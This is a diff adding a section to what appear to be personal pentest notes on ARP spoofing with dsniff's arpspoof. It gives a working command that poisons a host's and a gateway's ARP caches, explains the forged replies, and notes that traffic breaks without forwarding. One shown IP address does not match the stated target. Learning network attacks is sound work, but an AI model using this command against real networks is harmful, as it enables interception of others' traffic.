@@ -75,6 +75,34 @@ Guess what, depends by a lot of factors :D
 
 {% embed url="https://www.monkey.org/~dugsong/dsniff" %}
 
+```
+sudo arpspoof -i eth0 -t 192.168.1.115 -r 192.168.1.1 
+```
+
+Now the command is saying this to me:
+
+```
+hacker_mac target_mac 0806 42: arp reply 192.168.1.1 is-at hacker_mac
+```
+
+This is the ARP reply of the host that now thinks that the hacker\_mac is the default gateway. \
+Then:
+
+```
+hacker_mac dg_mac 0806 42: arp reply 192.168.1.93 is-at hacker_mac
+# dg_mac === default gateway MAC
+```
+
+This is the ARP reply of the dg that now thinks that the hacker\_mac is the host.&#x20;
+
+{% hint style="danger" %}
+But now, the connection of the host is not working. De fak?\
+Well, the hacker\_host is not configured to be a switch...\
+Or better, ARP spoofing doesn't mean auto-packet-redirect !!!
+{% endhint %}
+
+## ARP spoofing with packet redirect
+
 
 
 ## Sources
